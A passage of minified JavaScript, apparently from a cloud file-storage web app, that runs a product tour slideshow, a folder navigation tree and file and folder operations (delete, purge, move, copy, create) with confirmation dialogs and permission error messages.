.top-area").animate({bottom:$("#main .top-area").attr("prevBottom")},1e3,"easeOutQuad",(function(){$("#main .top-area").attr("style","")})).children().animate({opacity:"1"},500),e.slideDown(1e3,"easeOutQuad"),e.removeClass("expanded"),e.addClass("collapsed"),aow(e)),$(window).unbind(".tour-hash"),location.hash="noslide",$("body").removeClass("tour"),$("#tour-content-container").children().remove()})),a.stopPropagation(),a.preventDefault(),!1}))}})}function alK(e){location.hash="slide1",MFTOUR_sPreviousSlideHash=null,$(window).bind("hashchange.tour-hash",(function(){return"#noslide"==location.hash||""==location.hash?($(".tour-hide").trigger("click"),!1):MFTOUR_bIsAnimating?(location.hash=MFTOUR_sPreviousSlideHash,!1):!isNaN(parseInt(location.hash.replace("#","").replace("slide","")))&&(parseInt(location.hash.replace("#","").replace("slide",""))<1||parseInt(location.hash.replace("#","").replace("slide",""))>$("#tour-slides .slide").length?(location.hash="slide1",!1):MFTOUR_sPreviousSlideHash?MFTOUR_sPreviousSlideHash!=location.hash&&(apE(location.hash,MFTOUR_sPreviousSlideHash),void(MFTOUR_sPreviousSlideHash=location.hash)):(MFTOUR_sPreviousSlideHash=location.hash,!1))})),"#slide1"!=location.hash||MFTOUR_sPreviousSlideHash||$(window).hashchange(),$("#tour").length>0&&$("#tour").show(),$(window).trigger("resize"),$("body").addClass("tour"),setTimeout((function(){$(".full #tour-nav, .condensed #tour-nav").animate({bottom:"0"},1e3,"easeOutExpo")}),1e3),$("#tour-nav li.tour-icon a.current span").css({opacity:"1"});$("#tour-slide7 #signup-link").delegate("","click",(function(){$(this).hide(),$(".basic-spinner").css({display:"block"})})),$("#tour-slide6").delegate("a#tour-slide6-trigger","click",(function(e){return $("#tour-slide6-inner").animate({opacity:"0"},500,"easeOutExpo",(function(){$("#tour-verticalslider").animate({"margin-top":"-280px"},500,"easeOutExpo",(function(){$("#tour-companies-popup p, #tour-companies-popup a").css({display:"block"}),$("#tour-companies-popup p, #tour-companies-popup a").animate({opacity:"1"},500,"easeOutExpo")}))})),e.stopPropagation(),e.preventDefault(),!1})).delegate("a#tour-slide6-close","click",(function(e){$("#tour-companies-popup p, #tour-companies-popup a").animate({opacity:"0"},500,"easeOutExpo",(function(){$("#tour-companies-popup p, #tour-companies-popup a").css({display:"none"}),$("#tour-verticalslider").animate({"margin-top":"0px"},500,"easeOutExpo",(function(){$("#tour-slide6-inner").animate({opacity:"1"},500,"easeOutExpo")}))})),e.stopPropagation(),e.preventDefault()})),$("#tour-slides").delegate("#tour-previous","click",(function(e){return $("#tour-slides .slide.current").hasClass("firstslide")||MFTOUR_bIsAnimating||(location.hash="slide"+(parseInt($("#tour-slides .slide.current").index())-parseInt(1)-parseInt(1)),e.stopPropagation(),e.preventDefault()),!1})).delegate("#tour-next","click",(function(e){return $("#tour-slides .slide.current").hasClass("lastslide")||MFTOUR_bIsAnimating||(location.hash="slide"+(parseInt($("#tour-slides .slide.current").index())-parseInt(1)+parseInt(1)),e.stopPropagation(),e.preventDefault()),!1}))}function apE(e){var t=$("#tour-slides .slide.current"),a=t.index(),o=$("#tour-slides").find(".slide:eq("+(parseInt(e.replace("#","").replace("slide",""))-1)+")"),n=o.index();if(MFTOUR_bIsAnimating)return!1;MFTOUR_bIsAnimating=!0,o.css({left:(n<a?"-":"")+$(window).width()+"px"}).show(),o.addClass("current").animate({left:"0"},1e3,"easeOutExpo",(function(){MFTOUR_bIsAnimating=!1})),t.removeClass("current").animate({left:(n>a?"-":"")+$(window).width()+"px"},1e3,"easeOutExpo",(function(){$(this).hide()})),o.hasClass("firstslide")?$("#tour-previous").fadeOut():$("#tour-previous").fadeIn(),o.hasClass("lastslide")?$("#tour-next").fadeOut():$("#tour-next").fadeIn()}jQuery,$(document).keydown((function(e){"37"==e.keyCode&&$("body").hasClass("tour")&&(e.preventDefault(),$("#tour-previous").trigger("click")),"39"==e.keyCode&&$("body").hasClass("tour")&&(e.preventDefault(),$("#tour-next").trigger("click"))})),$("body").delegate(".tour-dropdown-from-top","click",(function(e){var t=!1;return $("html, body").animate({scrollTop:0},500,"easeOutExpo",(function(){if(!t){t=!0,0==$("#titlebar").length&&$("#content_container #header").after($("<div/>",{id:"titlebar",class:"removeOnHide"})),$("#titlebar").attr("prevHeight",$("#titlebar").height());var e=$(window).height();$(window).bind("resize.tour",(function(){$("#titlebar").css({height:$(window).height()})})),$("#titlebar > *").animate({opacity:"0"},1e3,"easeOutExpo"),$(".footer").hide(),$("#main").animate({opacity:"0"},500,"easeOutExpo",(function(){$(this).css({display:"none"}),$("body").css({overflow:"hidden"}),$("#titlebar").animate({height:e+"px"},1e3,"easeOutExpo",(function(){$.ajax({url:"/tour/tour.php",method:"POST",success:function(e){$("body").append($("<div></div>",{id:"tour"}).append(e)),$("#tour .wrap .right .btn").hide(),$("#tour-wrap").css({height:$(window).height(),"margin-top":"100%"}).animate({"margin-top":"0"},1e3,"easeOutExpo",(function(){$(this).css({height:"auto"})})),alK(e),t=!1}})}))}))}})),e.stopPropagation(),e.preventDefault(),!1})).delegate(".tour-hide","click",(function(e){var t=parseInt($("#titlebar").attr("prevHeight"));return $(window).height(),$("#titlebar").hasClass("removeOnHide")&&(t=0),location.hash="noslide",$("#tour-wrap").animate({"margin-top":"100%",bottom:"-100%"},1e3,"easeOutExpo",(function(){$("#tour").remove(),$(".footer").show(),$("#main").show(),$("#titlebar").animate({height:t+"px"},1e3,"easeOutExpo",(function(){$("body").removeClass("tour").css({overflow:"auto"}),$(window).unbind("resize.tour"),$("#titlebar").hasClass("removeOnHide")&&$("#titlebar").remove(),$("#main").animate({opacity:"1"},500,"easeOutExpo"),$("#titlebar > *").animate({opacity:"1"},1e3,"easeOutExpo")}))})),$(window).unbind(".tour-hash"),e.stopPropagation(),e.preventDefault(),!1})).delegate(".tour-content","click",(function(e){$("#tour-next").trigger("click")})),function(e){agi=function(t,a,o){var n=this;o=o||{},n.$NVT_oRoot=e(t)||{},n.Wr=a||{},n.alS=(o.alS||"key").replace("data-",""),n.alM=o.alM||"nav-arrow",n.amm=o.amm||"nav-display-name",n.amc=o.amc||function(){}},agi.prototype.amQ=function(t){var a=this;t&&e(t).length&&(a.$NVT_oRoot=e(t)),a.$NVT_oRoot.undelegate("a."+a.alM,"click").delegate("a."+a.alM,"click",(function(t){var o=e(this).closest("li").data(a.alS);return a.amg(o),aeV(t),!1}))},agi.prototype.ami=function(e){var t=this;return t.Wr[e]?"<ul>"+t.Wr[e].amf(t)+"</ul>":"<ul></ul>"},agi.prototype.amv=function(e){var t=this;t.$NVT_oRoot&&t.$NVT_oRoot.html(t.ami(e))},agi.prototype.alQ=function(){e.each(this.Wr,(function(e,t){t.amq="collapsed"}))},agi.prototype.anu=function(e,t){var a=this;t&&a.Wr[e]&&a.Wr[e].amy(t,a.$NVT_oRoot)},agi.prototype.amU=function(e){this.anu(e,"expanded")},agi.prototype.amx=function(e){this.anu(e,"collapsed")},agi.prototype.aFZ=function(e,t){var a=this,o=a.Wr[e];a.Wr&&o.ams&&a.Wr[o.ams]&&(delete a.Wr[o.ams].agd[e],o.ams=t,a.Wr[t].agd[e]=e)},agi.prototype.amF=function(e){var t=this;e&&e.ams&&t.Wr[e.ams]&&(t.Wr[e.ams].agd[e.agV]=e.agV,t.Wr[e.agV]=e)},agi.prototype.alI=function(e){var t=this;if(e){var a=t.Wr[e];a&&(t.Wr&&a.ams&&t.Wr[a.ams]&&delete t.Wr[a.ams].agd[e],t.Wr&&e&&t.Wr[e]&&delete t.Wr[e],a&&delete a)}},agi.prototype.amg=function(e){this.Wr[e].amj(this.$NVT_oRoot)},agi.prototype.amw=function(e){return this.Wr[e].ahs},agi.prototype.aml=function(e){var t=this;!function e(a){if(a){a.amy("expanded",t.$NVT_oRoot);var o=t.Wr[a.ams];o&&o!=a&&e(o)}}(t.Wr[e])},alU=function(e){var t=this;e=e||{},t.agV=e.agV||"",t.amB=e.amB||"",t.ahs=e.ahs||"collapsed",t.agd=e.agd||{},t.ams=e.ams||"",t.NTN_sDisplayClass=e.NTN_sDisplayClass||"",t.UU=e.UU||"no"},alU.prototype.amf=function(t){var a,o=this,n=!e.isEmptyObject(o.agd),r="yes"==o.UU||n,i='<li id="nav-'+o.agV+'" class="'+o.ahs+" "+o.NTN_sDisplayClass+'" data-'+t.alS+'="'+o.agV+'">';if(r&&(i+='<a class="'+t.alM+'" href="javascript:void(0);"></a>'),i+='<a href="javascript:void(0);" class="'+t.amm+'" title="'+htmlspecialchars(o.amB)+'">'+htmlspecialchars(o.amB)+"</a><ul>",n){var s=[];e.each(o.agd,(function(e){this==tH.root.folderkey&&delete o.agd[tH.root.folderkey],s.push(t.Wr[e])})),e.each(s.sort((a="amB",function(e,t){try{return e[a].toLowerCase()<t[a].toLowerCase()?-1:1}catch(e){return 0}})),(function(e,a){a&&(i+=a.amf(t))}))}return i+="</ul></li>"},alU.prototype.amj=function(t){var a=this;"collapsed"==a.ahs?e.publish("folder/nav_expand",[a.agV]):e.publish("folder/nav_collapse",[a.agV]),a.amy("collapsed"==a.ahs?"expanded":"collapsed",t)},alU.prototype.amy=function(e,t){var a=this;a.ahs=e||"collapsed",a.atb(t).removeClass("expanded").removeClass("collapsed").addClass(a.ahs)},alU.prototype.atb=function(t){return(t=t||e(document)).find("li#nav-"+this.agV)}}(jQuery),function(e){agX=function(t,a){var o=this;a=a||{},t=t||".folderlist_content",o.$list=e(t),o.amA=!1,o.anf=function(){},o.amK={},o.asf="",o.agY=new agi(t,{},{alS:"data-folderkey",alM:"folder_arrow",amm:"folder_name"})},agX.prototype.amn=function(e){this.amA=e},agX.prototype.amZ=function(){return this.amA},agX.prototype.ano=function(e){this.anf=e},agX.prototype.amO=function(){return this.anf},agX.prototype.amt=function(){var e=this;return e.amA&&e.amA.constructor&&e.amA.apply&&e.amA.call?e.amA.call(e):e.asf},agX.prototype.ane=function(t){var a=this;t&&e(t).length&&(a.$list=e(t)),(a=this).anf.call(a),a.agY.amQ(t),a.$list.filter(":not(.selectable)").delegate("a.folder_name","click",(function(t){return window.location.hash="#"+e(this).closest("li").data("folderkey"),!1}))},agX.prototype.ang=function(){return this.amK.folderkey||"myfiles"},agX.prototype.amW=function(){var t=this;e.each(t.agY.Wr,(function(){this.ams==this.agV&&(t.agY.Wr[this.agV].ams="myfiles")})),t.agY.amv(t.ang()),t.$list.filter(".droppable").find("a.folder_name").bind("draghover",(function(t){var a=e(this).toggleClass("folder_highlight",t.enter),o=a.data("timeout");t.enter&&a.parent().hasClass("collapsed")?(o&&(clearTimeout(o),o=null),o=setTimeout((function(){a.parent().addClass("expanded").removeClass("collapsed"),e.publish("folder/nav_expand",[a.parent().data("folderkey")])}),500),a.data("timeout",o)):o&&(clearTimeout(o),a.data("timeout",null))})),t.amT()},agX.prototype.amT=function(e,t){var a=this,o=e||a.amt();e&&!a.amA&&(a.asf=e),t||(a.agY.amU(a.ang()),a.agY.aml(o),a.$list.find(".current_folder_location").removeClass("current_folder_location").end().find("li#nav-"+(o||"")).addClass("current_folder_location"))},agX.prototype.aPN=function(e){this.agY.amU(e),this.agY.aml(e)},agX.prototype.ant=function(){var e=this;e.agY.alQ(),e.agY.amg(e.ang()),e.agY.amv(e.ang()),e.amT()},agX.prototype.amN=function(t){var a=this;t instanceof Array?e.each(t,(function(e,t){a.agY.alI(t)})):a.agY.alI(t),a.amW()},agX.prototype.amr=function(e,t){var a=new alU({agV:e.folderkey,amB:e.name,agd:amJ(e.folders)||{},ams:e.parent.folderkey,NTN_sDisplayClass:"no"==e.shared||""==e.shared||SHARED?"":"nav-linked-folder folder_name",UU:parseInt(e.folder_count,10)>0?"yes":"no"});this.agY.amF(a),t||this.amW()},agX.prototype.ann=function(t,a){var o=this;"string"==(typeof t).toLowerCase()?o.agY.aFZ(t,a):"object"==typeof t&&t.length&&e.each(t,(function(e,t){o.agY.aFZ(t,a)})),o.amW()},agX.prototype.ans=function(e,t){this.amr(e,t)},agX.prototype.apG=function(){var t=this,a=e("#folderTree .folderlist_content ul"),o=t.$list.outerHeight(),n=a.outerHeight();e("#folderTree .indicator-down").css({top:o+10}),n<=o?(e("#folderTree .indicator-up").hide(),e("#folderTree .indicator-down").hide()):0==t.$list.scrollTop()?(e("#folderTree .indicator-up").hide(),e("#folderTree .indicator-down").show()):t.$list.scrollTop()>=n-o?(e("#folderTree .indicator-up").show(),e("#folderTree .indicator-down").hide()):(e("#folderTree .indicator-up").show(),e("#folderTree .indicator-down").show())}}(jQuery),function(e){asR=function(t,a,o,n,r){var i=this;if(i.atw=a,i.auS=o,i.atx=n,i.atB=t,i.aty=r,i.aTA=!1,!window.tH||!window.tH.Cp||!window.tH.yJ)return!1;a||i.atB.Yw((function(e){"Success"==e.response.result&&(i.aTA=0==avH(e.response.user_info.options,20),tH.user_info=e.response.user_info)})),window.tH.Cp.WF=function(t){var a=e.extend(!0,{},t);return a.parent=a.parent&&a.parent.folderkey,JSON.stringify(a)},window.tH.Cp.Wm=function(e){try{var t=JSON.parse(e);return new window.tH.Cp(t)}catch(e){return!1}},window.tH.yJ.WF=function(t){var a=e.extend(!0,{},t);return a.parent=a.parent&&a.parent.folderkey,a.folders=e.map(e.values(a.folders),(function(e){return e.folderkey})),a.files=e.map(e.values(a.files),(function(e){return e.quickkey})),JSON.stringify(a)},window.tH.yJ.Wm=function(e){try{var t=JSON.parse(e);return folderext=new window.tH.yJ(t),folderext}catch(e){return!1}},window.tH.folders=new XV("folder",window.tH.yJ.WF,window.tH.yJ.Wm,a||r),window.tH.files=new XV("file",window.tH.Cp.WF,window.tH.Cp.Wm,a||r)},asR.prototype.auk=function(){atg=this,atg.aty=!0,window.tH.folders.ave(),window.tH.files.ave()},asR.prototype.ZR=function(){atg=this,atg.auS=(new Date).getTime()},asR.prototype.adF=function(){var t=this;return!!t.atw||(acY=(new Date).getTime(),!t.aTA&&acY-t.auS>t.atx?(QU(),LoadIframeLightbox("/templates/confirm/confirm_login.php",415,265,!1,!1,!0,!1,!1,(function(){dZ(),e("#modal_msg_iframe").unbind("load.LoadIframeLightbox")})),!1):(t.ZR(),!0))},asR.prototype.ahG=function(e){if(e){var t=window.tH.files.yx(e);if(t&&t.quickkey){var a=t.parent;a&&(a.file_count--,a.files&&a.files[e]&&delete a.files[e],tH.folders.Yx(a.folderkey,a)),window.tH.files.abg(e)}}},asR.prototype.Zs=function(t,a){var o=this,n=arguments.callee;if(o.adF()){n.onBefore&&n.onBefore.call(o,t,a);var r=[],i=[];if(t){for(var s=t.split(","),l=0;l<s.length;l++){(c=tH.files.yx(s[l]))&&c.delete_date&&(r.push(s[l]),s.splice(l,1))}t=s.join()}if(a){var d=a.split(",");for(l=0;l<d.length;l++){var c;(c=tH.folders.yx(d[l]))&&c.delete_date&&(i.push(d[l]),d.splice(l,1))}a=d.join()}(r.length>0||i.length>0)&&o.bet(r.join(),i.join(),!1),t&&window.tH.Cp.YH(t,{success:function(a,r,i){var s=[];e.each(t.split(","),(function(e,t){var a=window.tH.files.yx(t);a&&s.push(a),o.ahG(t)})),a.response&&o.ato(a.response.myfiles_revision),n.onSuccess&&n.onSuccess.call(o,s,"")},error:function(){window.localStorage&&localStorage.clear(),n.onError&&n.onError.call(o,t,""),Zi(0,"There was a problem while deleting the file(s).")}}),a&&window.tH.yJ.YH(a,{success:function(t,r,i){var s=[];e.each(a.split(","),(function(e,t){var a=window.tH.folders.yx(t);a&&(a&&s.push(a),window.tH.folders.abg(t),a.parent&&a.parent.folders&&a.parent.folders[t]&&delete a.parent.folders[t],a.parent.folder_count=Math.max(0,(parseInt(a.parent.folder_count,10)||0)-1),void 0!==a.total_folders&&(a.total_folders=Math.max(0,parseInt(a.total_folders)-1)),window.tH.folders.Yx(a.parent.folderkey,a.parent))})),t.response&&o.ato(t.response.myfiles_revision),n.onSuccess&&n.onSuccess.call(o,"",s)},error:function(){window.localStorage&&localStorage.clear(),n.onError&&n.onError.call(o,"",a),Zi(0,"There was a problem while deleting the folder(s).")}})}},asR.prototype.bet=function(t,a,o,n){var r=this,i=arguments.callee;if(r.adF()){var s=function(){i.onBefore&&i.onBefore.call(r,t,a),t&&window.tH.Cp.beo(t,{success:function(a,o,n){var s=[];e.each(t.split(","),(function(e,t){var a=window.tH.files.yx(t);a&&s.push(a),r.ahG(t)})),a.response&&r.ato(a.response.myfiles_revision),i.onSuccess&&i.onSuccess.call(r,s,"")},error:function(){window.localStorage&&localStorage.clear(),i.onError&&i.onError.call(r,t,""),Zi(0,"There was a problem while purging the file(s).")}}),a&&window.tH.yJ.beo(a,{success:function(t,o,n){var s=[];e.each(a.split(","),(function(e,t){var a=window.tH.folders.yx(t);a&&(a&&s.push(a),window.tH.folders.abg(t),a.parent&&a.parent.folders&&a.parent.folders[t]&&delete a.parent.folders[t],a.parent.folder_count=Math.max(0,(parseInt(a.parent.folder_count,10)||0)-1),void 0!==a.total_folders&&(a.total_folders=Math.max(0,parseInt(a.total_folders)-1)),window.tH.folders.Yx(a.parent.folderkey,a.parent))})),t.response&&r.ato(t.response.myfiles_revision),i.onSuccess&&i.onSuccess.call(r,"",s)},error:function(){window.localStorage&&localStorage.clear(),i.onError&&i.onError.call(r,t,""),Zi(0,"There was a problem while purging the folder(s).")}})};if(o){var l=(t.length>0?t.split(",").length:0)+(a.length>0?a.split(",").length:0);if(l<1)return;var d=(0==t.length?"Folder":0==a.length?"File":"Item")+(l>1?"s":""),c=l>1?"these "+l+" ":"this ";QS(n?"Empty Trash":"Delete "+d,"Are you sure you want to permanently delete "+c+d.toLowerCase()+"?",[["yes","Yes"],["no","No","gbtnPrimary"]],(function(e){"yes"==e&&s()}))}else s()}},asR.prototype.MYF_mEmptyTrash=function(e,t){var a=this,o=arguments.callee;if(a.adF()){var n=function(){o.onBefore&&o.onBefore.call(a,quickkeys,Bz),new window.tH.aCa(e||0).MFAPI_EmptyTrash({success:function(e,t,n){e.response&&e.response.myfiles_revision&&a.ato(e.response.myfiles_revision),o.onSuccess&&o.onSuccess.call(a)},error:function(){o.onError&&o.onError.call(a),Zi(0,"There was a problem while emptying trash.")}})};t?QS("Empty Trash","Are you sure you want to permanently delete all the items in your trash?",[["yes","Yes"],["no","No","gbtnPrimary"]],(function(e){"yes"==e&&n()}),[600]):n()}};var t=!1;asR.prototype.YO=function(a,o,n){var r=this,i=arguments.callee;if(!t&&r.adF()){"myfiles"===n&&(n=null);var s=window.tH.folders.yx(n)?window.tH.folders.yx(n):Xb.aQm[n],l=0;if(s.permissions&&(l=NZ(s)),n&&"myfiles"!=n&&"no"!=s.shared&&""!=s.shared&&2!=l)Zi(0,"You cannot move items into a linked folder.");else{if(-1!==document.getElementById("container").className.indexOf("collabmode")){var d=new tH.yJ("myfiles");d.folderkey="myfiles",d.name="My Files",d.files=[],d.folders=[],window.tH.folders.Yx("myfiles",d)}var c;if(a){var f=window.tH.files.yx(a.split(",")[0]);if(!(c=s)||!f)return i.onError&&i.onError.call(r,a,"",n),void Zi(0,"There was a problem while attempting to move a file.");if(f.parent&&f.parent.folderkey==c.folderkey)return;i.onBefore&&i.onBefore.call(r,a,"",s),t=!0,tH.Cp.aad(a,n,{success:function(s){var l,d,c=window.tH.folders.yx(n||"myfiles"),f=[];e.each(a.split(","),(function(e,t){(l=window.tH.files.yx(t))&&(f.push(l),(d=l.parent).files&&d.files[t]&&delete d.files[t],d.file_count=parseInt(d.file_count)-1,d&&void 0!==d.total_files&&(d.total_files=Math.max(0,parseInt(d.total_files)-1)),c&&void 0!==c.total_files&&(c.total_files=Math.max(0,parseInt(c.total_files)+1)),d.file_count<0&&(d.file_count=0),d.files&&d.files[t]&&delete d.files[t],c?(c.file_count=parseInt(c.file_count)+1,c.files||(c.files={}),c.files[t]=l,l.parent=c,window.tH.folders.Yx(c.folderkey,c),window.tH.folders.Yx(d.folderkey,d),window.tH.currentFolder&&window.tH.currentFolder.folderkey==c.folderkey&&(window.tH.currentFolder=c)):c=Xb.aQm[n],s.response.new_names&&s.response.new_names["file_"+t]&&(l.filename=s.response.new_names["file_"+t]),window.tH.files.Yx(l.quickkey,l),window.tH.currentFolder&&window.tH.currentFolder.folderkey==d.folderkey&&(window.tH.currentFolder=d))})),r.ato(s.response.myfiles_revision),o.length||(t=!1,i.onSuccess&&i.onSuccess.call(r,f,d,c))},error:function(s,l,d){window.localStorage&&localStorage.clear();var c="",f="";if("abort"!=l&&s.responseText){try{c=JSON.parse(s.responseText)}catch(e){}c&&(f=c.response.error.toString())}destination=window.tH.folders.yx(n||"myfiles"),e.each(a.split(","),(function(e,t){var a=window.tH.files.yx(t);Zi(0,"114"==f?"You do not have write permissions to move "+a.filename+" into the folder "+destination.name+".":"There was a problem while attempting to move "+a.filename+".")})),o.length||(t=!1),i.onError&&i.onError.call(r,a,"",n)}})}if(o){var u=window.tH.folders.yx(o.split(",")[0])?window.tH.folders.yx(o.split(",")[0]):Xb.aQm[o.split(",")[0]];if(!(c=s)||!u)return void Zi(0,"There was a problem while attempting to move a folder.");if(s.folderkey&&o.match(s.folderkey))return;if(u.parent&&u.parent.folderkey==c.folderkey||u.folderkey==c.folderkey)return void Zi(0,"There was a problem while attempting to move a folder.");i.onBefore&&i.onBefore.call(r,"",o,s);var p=[],h=!0;function m(e,t){return(e instanceof tH.yJ||e instanceof auj.aZG)&&void 0!==e.parent&&void 0!==e.parent.folderkey?(t.push(e.folderkey),m(e.parent,t)):t}if(p=m(c,[]),e.each(o.split(","),(function(t,a){-1!=e.inArray(a,p)&&(h=!1)})),!1===h)return void Zi(0,"There was a problem attempting to move a folder.");t=!0,tH.yJ.aad(o,n,{success:function(a){var s,l,d=window.tH.folders.yx(n||"myfiles")?window.tH.folders.yx(n||"myfiles"):Xb.aQm[n||"myfiles"],c=[];e.each(o.split(","),(function(e,t){(s=window.tH.folders.yx(t))&&(c.push(s),(l=s.parent?s.parent:window.tH.folders.yx(s.parent_folderkey)).folders&&l.folders[t]&&delete l.folders[t],l.folder_count=Math.max(0,(parseInt(l.folder_count,10)||0)-1),d?(d.folders[t]=s,d.folder_count=(parseInt(d.folder_count,10)||0)+1,s.parent=d,window.tH.folders.Yx(d.folderkey,d),window.tH.currentFolder&&window.tH.currentFolder.folderkey==d.folderkey&&(window.tH.currentFolder=d)):d=Xb.aQm[n],l.total_folders=Math.max(0,(parseInt(l.total_folders,10)||0)-1),d.total_folders=Math.max(0,(parseInt(d.total_folders,10)||0)+1),a.response.new_names&&a.response.new_names["folder_"+t]&&(s.name=a.response.new_names["folder_"+t]),window.tH.folders.Yx(s.folderkey,s),window.tH.folders.Yx(l.folderkey,l),window.tH.currentFolder&&window.tH.currentFolder.folderkey==l.folderkey&&(window.tH.currentFolder=l))})),a.response.myfiles_revision&&r.ato(a.response.myfiles_revision),t=!1,i.onSuccess&&i.onSuccess.call(r,c,l,d)},error:function(a,s,l){window.localStorage&&localStorage.clear();var d="",c="";if("abort"!=s&&a.responseText){try{d=JSON.parse(a.responseText)}catch(e){}d&&(c=d.response.error.toString())}destination=window.tH.folders.yx(n||"myfiles"),e.each(o.split(","),(function(e,t){var a=window.tH.folders.yx(t);Zi(0,"114"==c?"You do not have write permissions to move "+a.name+" into the folder "+destination.name+".":"There was a problem while attempting to move "+a.name+".")})),t=!1,i.onError&&i.onError.call(r,"",o,n)}})}}}},asR.prototype.aFI=function(t,a,o){var n=this,r=arguments.callee;if(n.adF()){var i;if(MAL_sAPIDest="myfiles"===o?null:o,i=window.tH.folders.yx(o),"myfiles"!=o&&""!=i.shared&&"no"!=i.shared){var s=NZ(i);if(2!=s)return void Zi(0,"You cannot copy items into a linked folder.")}if(-1!==document.getElementById("container").className.indexOf("collabmode")){var l=new tH.yJ("myfiles");l.folderkey="myfiles",l.name="My Files",l.files=[],l.folders=[],window.tH.folders.Yx("myfiles",l)}var d=[],c=[],f=[],u=[];t&&(-1!=t.indexOf(",")?d=t.split(","):d.push(t)),a&&(-1!=a.indexOf(",")?c=a.split(","):c.push(a));var p=window.tH.folders.yx(o);if(t){var h=window.tH.files.yx(t.split(",")[0]);if(!p||!h)return r.onError&&r.onError.call(n,t,"",o),void Zi(0,"There was a problem while attempting to copy a file. --- !!!");r.onBefore&&r.onBefore.call(n,t,"",i),tH.Cp.aET(t,MAL_sAPIDest,{success:function(s){var l,d=h.parent,c=window.tH.folders.yx(o||"myfiles"),f=[];e.each(t.split(","),(function(e,t){(l=window.tH.files.yx(t))&&f.push(l)})),s.response.new_quickkeys.length>0&&window.tH.Cp.asi(s.response.new_quickkeys.join(),(function(t){if(t.response){function o(e){i&&void 0!==i.total_files&&(i.total_files=Math.max(0,parseInt(i.total_files)+1)),i.files[e.quickkey]=e,i.file_count=parseInt(i.file_count)+1,e.parent=i,window.tH.files.Yx(e.quickkey,e),window.tH.folders.Yx(i.folderkey,i),u.push(e)}if(t.response.file_info)o(new window.tH.Cp(t.response.file_info,i));t.response.file_infos&&e.each(t.response.file_infos,(function(e,t){o(new window.tH.Cp(t,i))})),n.ato(s.response.myfiles_revision),a||r.onSuccess&&r.onSuccess.call(n,f,u,d,c)}}))},error:function(a,i,s){window.localStorage&&localStorage.clear();var l="",d="";if("abort"!=i&&a.responseText){try{l=JSON.parse(a.responseText)}catch(e){}l&&(d=l.response.error.toString())}var c=window.tH.folders.yx(o||"myfiles");e.each(t.split(","),(function(e,t){var a=window.tH.files.yx(t);if("114"==d)Zi(0,"You do not have write permissions to copy "+a.filename+" into the folder "+c.name+".");else if("162"==d){(new window.tH.Dv).aXn((function(e){var t=e.response.settings;t?Ni(a.size,t.storage_limit,t.used_storage_size,!0,t.storage_limit_exceeded):Zi(0,"The file  "+a.filename+" exceeded your total storage limit.")}))}else Zi(0,"There was a problem while attempting to copy "+a.filename+".")})),r.onError&&r.onError.call(n,t,"",o)}})}if(a){var m=window.tH.folders.yx(a.split(",")[0]);if(!p||!m)return r.onError&&r.onError.call(n,a,"",o),void Zi(0,"There was a problem while attempting to copy a file. --- !!!");r.onBefore&&r.onBefore.call(n,a,"",i),tH.yJ.aET(a,MAL_sAPIDest,{success:function(i){var s,l=m.parent,d=window.tH.folders.yx(o||"myfiles"),c=[];e.each(a.split(","),(function(e,t){s=window.tH.folders.yx(t),c.push(s)})),i.response.new_folderkeys.length>0&&window.tH.yJ.asi(i.response.new_folderkeys.join(),(function(a){if(a.response){function o(t){void 0!==d.total_folders&&(d.total_folders=Math.max(0,parseInt(d.total_folders)+1)),d.folders[t.folderkey]=t,d.folder_count=(parseInt(d.folder_count,10)||0)+1,t.parent=d,window.tH.folders.Yx(t.folderkey,t),window.tH.folders.Yx(d.folderkey,d),f.push(t),e.publish("folder/add",[t,d])}if(a.response.folder_info)o(new window.tH.yJ(a.response.folder_info,d));a.response.folder_infos&&e.each(a.response.folder_infos,(function(e,t){o(new window.tH.yJ(t,d))})),n.ato(i.response.myfiles_revision),t.length?r.onSuccess&&r.onSuccess.call(n,c,l,d,u,f):r.onSuccess&&r.onSuccess.call(n,c,f,l,d)}}))},error:function(i,s,l){window.localStorage&&localStorage.clear();var d="",c="";if("abort"!=s&&i.responseText){try{d=JSON.parse(i.responseText)}catch(e){}d&&(c=d.response.error.toString())}var f=window.tH.folders.yx(o||"myfiles");e.each(a.split(","),(function(e,t){var a=window.tH.folders.yx(t);"114"==c?Zi(0,"You do not have write permissions to copy "+a.name+" into the folder "+f.name+"."):"162"==c?aWg(!1,!1,!0):Zi(0,"There was a problem while attempting to copy "+a.name+".")})),r.onError&&r.onError.call(n,t,"",o)}})}}},asR.prototype.aUA=function(e,t){var a=this,o=arguments.callee;a.adF()&&(e&&""!=e?(o.onBefore&&o.onBefore.call(a,e,t),tH.Cp.aUT(e,t,{error:function(t,n,r){var i={},s=0;if("abort"!=n&&t.responseText){try{i=JSON.parse(t.responseText)}catch(e){}i&&(MYF_sErrCode=s=i.response.error)}o.onError&&o.onError.call(a,e,i.response,s)}})):o.onError&&o.onError.call(a,e,t))},asR.prototype.Wt=function(t,a,o){var n=this,r=arguments.callee,i="There was a problem while creating the subfolder.";if(n.adF()){t||(t="myfiles"),n.ZR();var s=tH.folders.yx(t);s||(s=new tH.yJ(t)),r.onBefore&&r.onBefore.call(n,s),tH.yJ.prototype.Yp.call(s,a,{success:function(e,t){void 0!==s.total_folders&&(s.total_folders=Math.max(0,parseInt(s.total_folders)+1)),e.name=t.response.name||e.name,s.folder_count=(parseInt(s.folder_count,10)||0)+1,s.folders[e.folderkey]=e,window.tH.folders.Yx(e.folderkey,e),e.flag=s.flag,r.onSuccess&&r.onSuccess.call(n,s,e,o),window.tH.folders.Yx(s.folderkey,s),n.ato(t.response.myfiles_revision)},error:function(t){var a=e.parseJSON(t.responseText).response.message;window.localStorage&&localStorage.clear(),r.onBefore&&r.onBefore.call(n,s),Zi(0,a||i)}})}},asR.prototype.SubFile=function(t,a,o,n){var r=this,i="There was a problem while creating the file.";if(r.adF()){r.ZR();var s=window.tH.folders.yx(t);s?s.CreateSubFile(a,o,{success:function(e,t){s.files[e.quickkey]=e,window.tH.files.Yx(e.quickkey,e),window.tH.folders.Yx(s.folderkey,s),n.onSuccess&&n.onSuccess.call(r,e)},error:function(t){var a=e.parseJSON(t.responseText).response,o=a.message,s=parseInt(a.error,10);window.localStorage&&localStorage.clear(),n.onError&&n.onError.call(r),162==s?aWg(!0,!1,!0):Zi(0,o||i)}}):Zi(0,i)}},asR.prototype.aah=function(t,a,o,n,r){var i=this,s=arguments.callee;if(i.adF()){i.ZR();var l={};if(a){var d=window.tH.files.yx(a);l.error=function(){window.localStorage&&localStorage.clear(),s.onError&&s.onError.call(i,d),Zi(0,"There was a problem while updating the 